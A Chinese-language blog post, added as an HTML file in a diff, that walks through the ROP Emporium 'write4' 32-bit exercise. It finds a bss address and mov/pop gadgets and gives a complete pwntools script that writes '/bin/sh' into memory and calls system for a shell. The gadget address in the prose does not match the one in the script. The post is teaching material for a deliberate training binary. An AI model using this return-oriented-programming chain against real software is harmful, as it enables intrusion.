@@ -1,0 +1,38 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>ROP-Emporium详解 - 不要见外，不要见怪</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/favicon.ico"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a><span>万事屋</span></a></li><li><a href="https://norw1nd.github.io/"><span>Norw1nd‘blog</span></a></li><li><a href="https://no4l.github.io/"><span>no4l’blog</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://callfiles.ueibo.com/hexo-theme-laughing/post_background.jpg"><div class="post-title"><h1 class="title">ROP-Emporium详解</h1><ul class="meta"><li><i class="icon icon-author"></i>会飞的鱼</li><li><i class="icon icon-clock"></i>4 Minutes</li><li><i class="icon icon-calendar"></i>October 14, 2018</li></ul></div></div><div class="article-content" style="max-width:800px"><p>1.write4</p>
+<p>32位：</p>
+<p>已知为栈溢出且覆盖ebp需要44个字节</p>
+<p>放ida32里查看一下函数调用以及字符串</p>
+<p>调用了system，但是没有/bin/sh相关字符串</p>
+<p><img src="/2018/10/14/ROP-Emporium详解/C:/Users\封丘现代\AppData\Local\Temp\1539532649002.png" alt="1539532649002"></p>
+<p><img src="/2018/10/14/ROP-Emporium详解/C:/Users\封丘现代\AppData\Local\Temp\1539532673993.png" alt="1539532673993"></p>
+<p>所以思路就是，将‘/bin/sh’写入合适的地址data_addr,将这个地址作为参数传给system，实现system（‘/bin/sh’）的调用</p>
+<p>0x00：寻找data_addr</p>
+<p>我们肯定要把字符串写进程序的某一段中，一般来说，具有读写权限且可以随意修改数据的有bss段和data段，再ida中ctrl+s查看各段的权限</p>
+<p><img src="/2018/10/14/ROP-Emporium详解/C:/Users\封丘现代\AppData\Local\Temp\1539533160691.png" alt="1539533160691"></p>
+<p>但是data段太小，这里我们选择bss段</p>
+<p><img src="/2018/10/14/ROP-Emporium详解/C:/Users\封丘现代\AppData\Local\Temp\1539533302754.png" alt="1539533302754"></p>
+<p>按理说选哪个bss地址都可以，但为了保证空间足够大，我们选择段首</p>
+<p>0x0804A040</p>
+<p>0x01：往data_addr写入数据</p>
+<p>如何数据写入内存中呢？联想到汇编的寻址方式我们可以想到，将数据存入一个寄存器a中，将地址存入寄存器b中，通过寄存器相对寻址和mov指令，就可以实现向内存中写入数据 用ROPgadget –binary write432 –only ‘ret|mov’找gadgets</p>
+<p><img src="/2018/10/14/ROP-Emporium详解/C:/Users\封丘现代\AppData\Local\Temp\1539533963921.png" alt="1539533963921"></p>
+<p>这里选0x08048670</p>
+<p>0x10：给edi和ebp赋值</p>
+<p>ROPgadget –binary write432 –only ‘pop|ret’</p>
+<p><img src="/2018/10/14/ROP-Emporium详解/C:/Users\封丘现代\AppData\Local\Temp\1539534201012.png" alt="1539534201012"></p>
+<p>这里就用0x4080486d9</p>
+<p>0x11 exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./write432&apos;)</span><br><span class="line"></span><br><span class="line">system_plt = 0x08048430</span><br><span class="line">data_addr = 0x0804A040</span><br><span class="line">mov_edi_ebp = 0x08048670</span><br><span class="line">pop_edi_ebp = 0x080486da</span><br><span class="line">pad = &apos;A&apos;*44</span><br><span class="line"></span><br><span class="line">payload = pad</span><br><span class="line">payload += p32(pop_edi_ebp)</span><br><span class="line">payload += p32(data_addr)</span><br><span class="line">payload += &apos;/bin&apos;</span><br><span class="line">payload += p32(mov_edi_ebp)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_edi_ebp)</span><br><span class="line">payload += p32(data_addr+4)</span><br><span class="line">payload += &apos;/sh\x00&apos;</span><br><span class="line">payload += p32(mov_edi_ebp)</span><br><span class="line"></span><br><span class="line">payload += p32(system_plt)</span><br><span class="line">payload += &apos;BBBB&apos;</span><br><span class="line">payload += p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="cjn93af1k00003wu2ikax3k8w" data-title="ROP-Emporium详解" data-url="http://yoursite.com/2018/10/14/ROP-Emporium详解/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+var duoshuoQuery = {short_name: siteName};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2018/10/14/人生第五大错觉之。。。。/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/BoizZ" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a title="Weibo" target="_blank"><i class="icon icon-weibo"></i></a></li><li><a title="SegmentFault" target="_blank"><i class="icon icon-segmentfault"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2018 不要见外，不要见怪<br><small>POWER BY <a href="https://hexo.io" target="_blank">HEXO</a></small><small>, THEME BY <a href="https://github.com/BoizZ/hexo-theme-laughing" target="_blank">LAUGHING</a></small></p></div></div></div><script>var wrap = document.getElementById('wrap');
+window.onload = function () {
+  wrap.className += ' done';
+}</script></body></html>
